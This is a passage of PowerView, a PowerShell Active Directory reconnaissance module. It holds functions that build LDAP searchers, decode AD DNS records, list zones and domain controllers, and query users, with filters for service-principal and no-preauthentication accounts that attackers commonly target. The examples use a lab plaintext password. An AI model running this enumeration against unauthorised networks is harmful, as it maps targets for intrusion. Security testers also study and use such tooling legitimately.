        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $TargetDomain = $Domain
        }
        else {
            # if not -Domain is specified, retrieve the current domain name
            if ($PSBoundParameters['Credential']) {
                $DomainObject = Get-Domain -Credential $Credential
            }
            else {
                $DomainObject = Get-Domain
            }
            $TargetDomain = $DomainObject.Name
        }

        if (-not $PSBoundParameters['Server']) {
            # if there's not a specified server to bind to, try to pull the current domain PDC
            try {
                if ($DomainObject) {
                    $BindServer = $DomainObject.PdcRoleOwner.Name
                }
                elseif ($PSBoundParameters['Credential']) {
                    $BindServer = ((Get-Domain -Credential $Credential).PdcRoleOwner).Name
                }
                else {
                    $BindServer = ((Get-Domain).PdcRoleOwner).Name
                }
            }
            catch {
                throw "[Get-DomainSearcher] Error in retrieving PDC for current domain: $_"
            }
        }
        else {
            $BindServer = $Server
        }

        $SearchString = 'LDAP://'

        if ($BindServer -and ($BindServer.Trim() -ne '')) {
            $SearchString += $BindServer
            if ($TargetDomain) {
                $SearchString += '/'
            }
        }

        if ($PSBoundParameters['SearchBasePrefix']) {
            $SearchString += $SearchBasePrefix + ','
        }

        if ($PSBoundParameters['SearchBase']) {
            if ($SearchBase -Match '^GC://') {
                # if we're searching the global catalog, get the path in the right format
                $DN = $SearchBase.ToUpper().Trim('/')
                $SearchString = ''
            }
            else {
                if ($SearchBase -match '^LDAP://') {
                    if ($SearchBase -match "LDAP://.+/.+") {
                        $SearchString = ''
                        $DN = $SearchBase
                    }
                    else {
                        $DN = $SearchBase.SubString(7)
                    }
                }
                else {
                    $DN = $SearchBase
                }
            }
        }
        else {
            # transform the target domain name into a distinguishedName if an ADS search base is not specified
            if ($TargetDomain -and ($TargetDomain.Trim() -ne '')) {
                $DN = "DC=$($TargetDomain.Replace('.', ',DC='))"
            }
        }

        $SearchString += $DN
        Write-Verbose "[Get-DomainSearcher] search string: $SearchString"

        if ($Credential -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose "[Get-DomainSearcher] Using alternate credentials for LDAP connection"
            # bind to the inital search object using alternate credentials
            $DomainObject = New-Object DirectoryServices.DirectoryEntry($SearchString, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            $Searcher = New-Object System.DirectoryServices.DirectorySearcher($DomainObject)
        }
        else {
            # bind to the inital object using the current credentials
            $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
        }

        $Searcher.PageSize = $ResultPageSize
        $Searcher.SearchScope = $SearchScope
        $Searcher.CacheResults = $False
        $Searcher.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All

        if ($PSBoundParameters['ServerTimeLimit']) {
            $Searcher.ServerTimeLimit = $ServerTimeLimit
        }

        if ($PSBoundParameters['Tombstone']) {
            $Searcher.Tombstone = $True
        }

        if ($PSBoundParameters['LDAPFilter']) {
            $Searcher.filter = $LDAPFilter
        }

        if ($PSBoundParameters['SecurityMasks']) {
            $Searcher.SecurityMasks = Switch ($SecurityMasks) {
                'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }
                'Group' { [System.DirectoryServices.SecurityMasks]::Group }
                'None' { [System.DirectoryServices.SecurityMasks]::None }
                'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }
                'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }

        if ($PSBoundParameters['Properties']) {
            # handle an array of properties to load w/ the possibility of comma-separated strings
            $PropertiesToLoad = $Properties| ForEach-Object { $_.Split(',') }
            $Null = $Searcher.PropertiesToLoad.AddRange(($PropertiesToLoad))
        }

        $Searcher
    }
}

function Convert-DNSRecord {
<#
.SYNOPSIS

Helpers that decodes a binary DNS record blob.

Author: Michael B. Smith, Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Decodes a binary blob representing an Active Directory DNS entry.
Used by Get-DomainDNSRecord.

Adapted/ported from Michael B. Smith's code at https://raw.githubusercontent.com/mmessano/PowerShell/master/dns-dump.ps1

.PARAMETER DNSRecord

A byte array representing the DNS record.

.OUTPUTS

System.Management.Automation.PSCustomObject

Outputs custom PSObjects with detailed information about the DNS record entry.

.LINK

https://raw.githubusercontent.com/mmessano/PowerShell/master/dns-dump.ps1
#>

    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Byte[]]
        $DNSRecord
    )

    BEGIN {
        function Get-Name {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseOutputTypeCorrectly', '')]
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Raw
            )

            [Int]$Length = $Raw[0]
            [Int]$Segments = $Raw[1]
            [Int]$Index =  2
            [String]$Name  = ''

            while ($Segments-- -gt 0)
            {
                [Int]$SegmentLength = $Raw[$Index++]
                while ($SegmentLength-- -gt 0) {
                    $Name += [Char]$Raw[$Index++]
                }
                $Name += "."
            }
            $Name
        }
    }

    PROCESS {
        # $RDataLen = [BitConverter]::ToUInt16($DNSRecord, 0)
        $RDataType = [BitConverter]::ToUInt16($DNSRecord, 2)
        $UpdatedAtSerial = [BitConverter]::ToUInt32($DNSRecord, 8)

        $TTLRaw = $DNSRecord[12..15]

        # reverse for big endian
        $Null = [array]::Reverse($TTLRaw)
        $TTL = [BitConverter]::ToUInt32($TTLRaw, 0)

        $Age = [BitConverter]::ToUInt32($DNSRecord, 20)
        if ($Age -ne 0) {
            $TimeStamp = ((Get-Date -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).AddHours($age)).ToString()
        }
        else {
            $TimeStamp = '[static]'
        }

        $DNSRecordObject = New-Object PSObject

        if ($RDataType -eq 1) {
            $IP = "{0}.{1}.{2}.{3}" -f $DNSRecord[24], $DNSRecord[25], $DNSRecord[26], $DNSRecord[27]
            $Data = $IP
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'A'
        }

        elseif ($RDataType -eq 2) {
            $NSName = Get-Name $DNSRecord[24..$DNSRecord.length]
            $Data = $NSName
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'NS'
        }

        elseif ($RDataType -eq 5) {
            $Alias = Get-Name $DNSRecord[24..$DNSRecord.length]
            $Data = $Alias
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'CNAME'
        }

        elseif ($RDataType -eq 6) {
            # TODO: how to implement properly? nested object?
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'SOA'
        }

        elseif ($RDataType -eq 12) {
            $Ptr = Get-Name $DNSRecord[24..$DNSRecord.length]
            $Data = $Ptr
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'PTR'
        }

        elseif ($RDataType -eq 13) {
            # TODO: how to implement properly? nested object?
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'HINFO'
        }

        elseif ($RDataType -eq 15) {
            # TODO: how to implement properly? nested object?
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'MX'
        }

        elseif ($RDataType -eq 16) {
            [string]$TXT  = ''
            [int]$SegmentLength = $DNSRecord[24]
            $Index = 25

            while ($SegmentLength-- -gt 0) {
                $TXT += [char]$DNSRecord[$index++]
            }

            $Data = $TXT
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'TXT'
        }

        elseif ($RDataType -eq 28) {
            # TODO: how to implement properly? nested object?
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'AAAA'
        }

        elseif ($RDataType -eq 33) {
            # TODO: how to implement properly? nested object?
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'SRV'
        }

        else {
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'UNKNOWN'
        }

        $DNSRecordObject | Add-Member Noteproperty 'UpdatedAtSerial' $UpdatedAtSerial
        $DNSRecordObject | Add-Member Noteproperty 'TTL' $TTL
        $DNSRecordObject | Add-Member Noteproperty 'Age' $Age
        $DNSRecordObject | Add-Member Noteproperty 'TimeStamp' $TimeStamp
        $DNSRecordObject | Add-Member Noteproperty 'Data' $Data
        $DNSRecordObject
    }
}

function Get-DomainDNSZone {
<#
.SYNOPSIS

Enumerates the Active Directory DNS zones for a given domain.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty  

.PARAMETER Domain

The domain to query for zones, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to for the search.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainDNSZone

Retrieves the DNS zones for the current domain.

.EXAMPLE

Get-DomainDNSZone -Domain dev.testlab.local -Server primary.testlab.local

Retrieves the DNS zones for the dev.testlab.local domain, binding to primary.testlab.local.

.OUTPUTS

PowerView.DNSZone

Outputs custom PSObjects with detailed information about the DNS zone.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSZone')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $SearcherArguments = @{
            'LDAPFilter' = '(objectClass=dnsZone)'
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $DNSSearcher1 = Get-DomainSearcher @SearcherArguments

        if ($DNSSearcher1) {
            if ($PSBoundParameters['FindOne']) { $Results = $DNSSearcher1.FindOne()  }
            else { $Results = $DNSSearcher1.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                $Out = Convert-LDAPProperty -Properties $_.Properties
                $Out | Add-Member NoteProperty 'ZoneName' $Out.name
                $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')
                $Out
            }

            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainDFSShare] Error disposing of the Results object: $_"
                }
            }
            $DNSSearcher1.dispose()
        }

        $SearcherArguments['SearchBasePrefix'] = 'CN=MicrosoftDNS,DC=DomainDnsZones'
        $DNSSearcher2 = Get-DomainSearcher @SearcherArguments

        if ($DNSSearcher2) {
            try {
                if ($PSBoundParameters['FindOne']) { $Results = $DNSSearcher2.FindOne() }
                else { $Results = $DNSSearcher2.FindAll() }
                $Results | Where-Object {$_} | ForEach-Object {
                    $Out = Convert-LDAPProperty -Properties $_.Properties
                    $Out | Add-Member NoteProperty 'ZoneName' $Out.name
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')
                    $Out
                }
                if ($Results) {
                    try { $Results.dispose() }
                    catch {
                        Write-Verbose "[Get-DomainDNSZone] Error disposing of the Results object: $_"
                    }
                }
            }
            catch {
                Write-Verbose "[Get-DomainDNSZone] Error accessing 'CN=MicrosoftDNS,DC=DomainDnsZones'"
            }
            $DNSSearcher2.dispose()
        }
    }
}

function Get-DomainDNSRecord {
<#
.SYNOPSIS

Enumerates the Active Directory DNS records for a given zone.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty, Convert-DNSRecord  

.DESCRIPTION

Given a specific Active Directory DNS zone name, query for all 'dnsNode'
LDAP entries using that zone as the search base. Return all DNS entry results
and use Convert-DNSRecord to try to convert the binary DNS record blobs.

.PARAMETER ZoneName

Specifies the zone to query for records (which can be enumearted with Get-DomainDNSZone).

.PARAMETER Domain

The domain to query for zones, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to for the search.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainDNSRecord -ZoneName testlab.local

Retrieve all records for the testlab.local zone.

.EXAMPLE

Get-DomainDNSZone | Get-DomainDNSRecord

Retrieve all records for all zones in the current domain.

.EXAMPLE

Get-DomainDNSZone -Domain dev.testlab.local | Get-DomainDNSRecord -Domain dev.testlab.local

Retrieve all records for all zones in the dev.testlab.local domain.

.OUTPUTS

PowerView.DNSRecord

Outputs custom PSObjects with detailed information about the DNS record entry.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSRecord')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0,  Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ZoneName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties = 'name,distinguishedname,dnsrecord,whencreated,whenchanged',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $SearcherArguments = @{
            'LDAPFilter' = '(objectClass=dnsNode)'
            'SearchBasePrefix' = "DC=$($ZoneName),CN=MicrosoftDNS,DC=DomainDnsZones"
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $DNSSearcher = Get-DomainSearcher @SearcherArguments

        if ($DNSSearcher) {
            if ($PSBoundParameters['FindOne']) { $Results = $DNSSearcher.FindOne() }
            else { $Results = $DNSSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                try {
                    $Out = Convert-LDAPProperty -Properties $_.Properties | Select-Object name,distinguishedname,dnsrecord,whencreated,whenchanged
                    $Out | Add-Member NoteProperty 'ZoneName' $ZoneName

                    # convert the record and extract the properties
                    if ($Out.dnsrecord -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                        # TODO: handle multiple nested records properly?
                        $Record = Convert-DNSRecord -DNSRecord $Out.dnsrecord[0]
                    }
                    else {
                        $Record = Convert-DNSRecord -DNSRecord $Out.dnsrecord
                    }

                    if ($Record) {
                        $Record.PSObject.Properties | ForEach-Object {
                            $Out | Add-Member NoteProperty $_.Name $_.Value
                        }
                    }

                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSRecord')
                    $Out
                }
                catch {
                    Write-Warning "[Get-DomainDNSRecord] Error: $_"
                    $Out
                }
            }

            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainDNSRecord] Error disposing of the Results object: $_"
                }
            }
            $DNSSearcher.dispose()
        }
    }
}

function Get-Domain {
<#
.SYNOPSIS

Returns the domain object for the current (or specified) domain.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Returns a System.DirectoryServices.ActiveDirectory.Domain object for the current
domain or the domain specified with -Domain X.

.PARAMETER Domain

Specifies the domain name to query for, defaults to the current domain.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-Domain -Domain testlab.local

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-Domain -Credential $Cred

.OUTPUTS

System.DirectoryServices.ActiveDirectory.Domain

A complex .NET domain object.

.LINK

http://social.technet.microsoft.com/Forums/scriptcenter/en-US/0c5b3f83-e528-4d49-92a4-dee31f4b481c/finding-the-dn-of-the-the-domain-without-admodule-in-powershell?forum=ITCG
#>

    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters['Credential']) {

            Write-Verbose '[Get-Domain] Using alternate credentials for Get-Domain'

            if ($PSBoundParameters['Domain']) {
                $TargetDomain = $Domain
            }
            else {
                # if no domain is supplied, extract the logon domain from the PSCredential passed
                $TargetDomain = $Credential.GetNetworkCredential().Domain
                Write-Verbose "[Get-Domain] Extracted domain '$TargetDomain' from -Credential"
            }

            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $TargetDomain, $Credential.UserName, $Credential.GetNetworkCredential().Password)

            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            catch {
                Write-Verbose "[Get-Domain] The specified domain '$TargetDomain' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
            }
        }
        elseif ($PSBoundParameters['Domain']) {
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            catch {
                Write-Verbose "[Get-Domain] The specified domain '$Domain' does not exist, could not be contacted, or there isn't an existing trust : $_"
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                Write-Verbose "[Get-Domain] Error retrieving the current domain: $_"
            }
        }
    }
}

function Get-DomainController {
<#
.SYNOPSIS

Return the domain controllers for the current (or specified) domain.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainComputer, Get-Domain  

.DESCRIPTION

Enumerates the domain controllers for the current or specified domain.
By default built in .NET methods are used. The -LDAP switch uses Get-DomainComputer
to search for domain controllers.

.PARAMETER Domain

The domain to query for domain controllers, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER LDAP

Switch. Use LDAP queries to determine the domain controllers instead of built in .NET methods.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainController -Domain 'test.local'

Determine the domain controllers for 'test.local'.

.EXAMPLE

Get-DomainController -Domain 'test.local' -LDAP

Determine the domain controllers for 'test.local' using LDAP queries.

.EXAMPLE

'test.local' | Get-DomainController

Determine the domain controllers for 'test.local'.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainController -Credential $Cred

.OUTPUTS

PowerView.Computer

Outputs custom PSObjects with details about the enumerated domain controller if -LDAP is specified.

System.DirectoryServices.ActiveDirectory.DomainController

If -LDAP isn't specified.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Computer')]
    [OutputType('System.DirectoryServices.ActiveDirectory.DomainController')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Switch]
        $LDAP,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $Arguments = @{}
        if ($PSBoundParameters['Domain']) { $Arguments['Domain'] = $Domain }
        if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $Credential }

        if ($PSBoundParameters['LDAP'] -or $PSBoundParameters['Server']) {
            if ($PSBoundParameters['Server']) { $Arguments['Server'] = $Server }

            # UAC specification for domain controllers
            $Arguments['LDAPFilter'] = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'

            Get-DomainComputer @Arguments
        }
        else {
            $FoundDomain = Get-Domain @Arguments
            if ($FoundDomain) {
                $FoundDomain.DomainControllers
            }
        }
    }
}

function Get-DomainUser {
<#
.SYNOPSIS

Return all users or specific user objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-ADName, Convert-LDAPProperty  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
"-Properties samaccountname,usnchanged,...". By default, all user objects for
the current domain are returned.

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted. Also accepts DOMAIN\user format.

.PARAMETER SPN

Switch. Only return user objects with non-null service principal names.

.PARAMETER UACFilter

Dynamic parameter that accepts one or more values from $UACEnum, including
"NOT_X" negation forms. To see all possible values, run '0|ConvertFrom-UACValue -ShowAll'.

.PARAMETER AdminCount

Switch. Return users with '(adminCount=1)' (meaning are/were privileged).

.PARAMETER AllowDelegation

Switch. Return user accounts that are not marked as 'sensitive and not allowed for delegation'

.PARAMETER DisallowDelegation

Switch. Return user accounts that are marked as 'sensitive and not allowed for delegation'

.PARAMETER TrustedToAuth

Switch. Return computer objects that are trusted to authenticate for other principals.

.PARAMETER PreauthNotRequired

Switch. Return user accounts with "Do not require Kerberos preauthentication" set.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainUser -Domain testlab.local

Return all users for the testlab.local domain

.EXAMPLE

Get-DomainUser "S-1-5-21-890171859-3433809279-3366196753-1108","administrator"

Return the user with the given SID, as well as Administrator.

.EXAMPLE

'S-1-5-21-890171859-3433809279-3366196753-1114', 'CN=dfm,CN=Users,DC=testlab,DC=local','4c435dd7-dc58-4b14-9a5e-1fdb0e80d201','administrator' | Get-DomainUser -Properties samaccountname,lastlogoff

lastlogoff                                   samaccountname
----------                                   --------------
12/31/1600 4:00:00 PM                        dfm.a
12/31/1600 4:00:00 PM                        dfm
12/31/1600 4:00:00 PM                        harmj0y
12/31/1600 4:00:00 PM                        Administrator

.EXAMPLE

Get-DomainUser -SearchBase "LDAP://OU=secret,DC=testlab,DC=local" -AdminCount -AllowDelegation

Search the specified OU for privileged user (AdminCount = 1) that allow delegation

.EXAMPLE

Get-DomainUser -LDAPFilter '(!primarygroupid=513)' -Properties samaccountname,lastlogon

Search for users with a primary group ID other than 513 ('domain users') and only return samaccountname and lastlogon

.EXAMPLE

Get-DomainUser -UACFilter DONT_REQ_PREAUTH,NOT_PASSWORD_EXPIRED

Find users who doesn't require Kerberos preauthentication and DON'T have an expired password.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainUser -Credential $Cred

.EXAMPLE

Get-Domain | Select-Object -Expand name
testlab.local

Get-DomainUser dev\user1 -Verbose -Properties distinguishedname
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local
VERBOSE: [Get-DomainUser] filter string: (&(samAccountType=805306368)(|(samAccountName=user1)))

distinguishedname
-----------------
CN=user1,CN=Users,DC=dev,DC=testlab,DC=local

.INPUTS

String

.OUTPUTS

PowerView.User

Custom PSObject with translated user property fields.

PowerView.User.Raw

The raw DirectoryServices.SearchResult object, if -Raw is enabled.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.User')]
    [OutputType('PowerView.User.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [Switch]
        $SPN,

        [Switch]
        $AdminCount,

        [Parameter(ParameterSetName = 'AllowDelegation')]
        [Switch]
        $AllowDelegation,

        [Parameter(ParameterSetName = 'DisallowDelegation')]
        [Switch]
        $DisallowDelegation,

        [Switch]
        $TrustedToAuth,

        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
        [Switch]
        $PreauthNotRequired,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    DynamicParam {
        $UACValueNames = [Enum]::GetNames($UACEnum)
        # add in the negations
        $UACValueNames = $UACValueNames | ForEach-Object {$_; "NOT_$_"}
        # create new dynamic parameter
        New-DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
    }

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
